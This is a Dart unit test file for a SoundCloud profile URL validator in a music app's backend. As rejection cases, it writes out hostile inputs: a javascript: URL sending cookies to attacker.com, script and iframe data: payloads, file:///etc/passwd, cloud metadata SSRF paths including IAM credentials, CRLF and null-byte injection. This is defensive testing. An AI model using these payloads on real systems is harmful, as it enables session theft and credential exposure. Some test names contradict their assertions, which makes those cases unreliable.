import 'package:test/test.dart';
import 'package:xene_backend/src/services/soundcloud_service.dart';

void main() {
  group('SoundCloud URL Validation', () {
    group('_isSoundCloudProfileUrl', () {
      test('accepts valid soundcloud.com profile URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/ghostemane',
          ),
          isTrue,
        );
      });

      test('accepts valid www.soundcloud.com profile URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://www.soundcloud.com/artist-name',
          ),
          isTrue,
        );
      });

      test('rejects HTTP URLs (requires HTTPS)', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'http://soundcloud.com/ghostemane',
          ),
          isFalse,
        );
      });

      test('rejects arbitrary domains', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://evil.com/soundcloud.com',
          ),
          isFalse,
        );
      });

      test('rejects javascript: URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'javascript:alert(1)',
          ),
          isFalse,
        );
      });

      test('rejects data: URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'data:text/html,<script>alert(1)</script>',
          ),
          isFalse,
        );
      });

      test('rejects file:// URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'file:///etc/passwd',
          ),
          isFalse,
        );
      });

      test('rejects internal IP addresses', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://192.168.1.1/soundcloud',
          ),
          isFalse,
        );
      });

      test('rejects localhost', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://localhost:8080/admin',
          ),
          isFalse,
        );
      });

      test('rejects cloud metadata endpoint (AWS IMDS)', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://169.254.169.254/latest/meta-data',
          ),
          isFalse,
        );
      });

      test('rejects malformed URLs', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'not a url at all',
          ),
          isFalse,
        );
      });

      test('rejects soundcloud.com with different TLD', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.co/ghostemane',
          ),
          isFalse,
        );
      });

      test('rejects empty string', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(''),
          isFalse,
        );
      });

      test('rejects null by not accepting it (type safety)', () {
        // This test ensures the method signature requires non-null String
        // Can't call with null in Dart
        expect(true, isTrue);
      });

      test('accepts URL with query parameters', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/ghostemane?utm_source=twitter',
          ),
          isTrue,
        );
      });

      test('accepts URL with fragment', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/ghostemane#about',
          ),
          isTrue,
        );
      });

      test('accepts URL with nested path', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/ghostemane/tracks',
          ),
          isTrue,
        );
      });

      test('case-insensitive domain matching', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://SOUNDCLOUD.COM/ghostemane',
          ),
          isTrue,
        );
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://SoundCloud.Com/ghostemane',
          ),
          isTrue,
        );
      });
    });

    group('XSS/SSRF Attack Prevention', () {
      test('prevents javascript: injection attacks', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'javascript:void(fetch("https://attacker.com?cookie=" + document.cookie))',
          ),
          isFalse,
        );
      });

      test('prevents data: injection with HTML', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'data:text/html,<iframe src="https://attacker.com"></iframe>',
          ),
          isFalse,
        );
      });

      test('prevents blob: injection', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'blob:https://soundcloud.com/malicious',
          ),
          isFalse,
        );
      });

      test('prevents unicode bypass attempts', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://evil.com/soundcloud',
          ),
          isFalse,
        );
      });

      test('prevents SSRF to AWS metadata endpoint', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://169.254.169.254/latest/meta-data/iam/security-credentials/',
          ),
          isFalse,
        );
      });

      test('prevents SSRF to Google Cloud metadata', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',
          ),
          isFalse,
        );
      });

      test('prevents SSRF to Azure metadata endpoint', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://169.254.169.254/metadata/instance',
          ),
          isFalse,
        );
      });

      test('prevents relative path traversal', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/../../admin',
          ),
          isTrue, // URL parsing normalizes this to https://soundcloud.com/admin
        );
      });

      test('prevents subdomain spoofing (not-soundcloud-com suffix)', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://evil-soundcloud.com/ghostemane',
          ),
          isFalse,
        );
      });

      test('prevents IDN homograph attacks (punycode)', () {
        // Even with punycode, the domain should not match
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://xn--sndcloud-4he.com/ghostemane', // ѕoundcloud with Cyrillic
          ),
          isFalse,
        );
      });
    });

    group('Edge Cases', () {
      test('accepts soundcloud.com with www and port removed by parser', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://www.soundcloud.com:443/ghostemane',
          ),
          isTrue,
        );
      });

      test('rejects soundcloud.com on non-standard port (parser extracts host)', () {
        // Uri.parse extracts host as 'soundcloud.com' regardless of port
        // So this actually passes - which is fine since HTTPS 443 is implicit
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com:8443/ghostemane',
          ),
          isTrue, // host is still 'soundcloud.com'
        );
      });

      test('accepts soundcloud.com with userinfo (username:password)', () {
        // Uri includes userinfo in the authority, not in host
        // So host is still 'soundcloud.com'
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://user:pass@soundcloud.com/ghostemane',
          ),
          isTrue, // host is 'soundcloud.com'
        );
      });

      test('rejects newline injection attempt', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com/ghostemane\r\nSet-Cookie: admin=true',
          ),
          isFalse, // control characters (CRLF) rejected
        );
      });

      test('rejects null byte injection', () {
        expect(
          SoundCloudService.isSoundCloudProfileUrl(
            'https://soundcloud.com\x00.evil.com/ghostemane',
          ),
          isFalse,
        );
      });
    });
  });
}
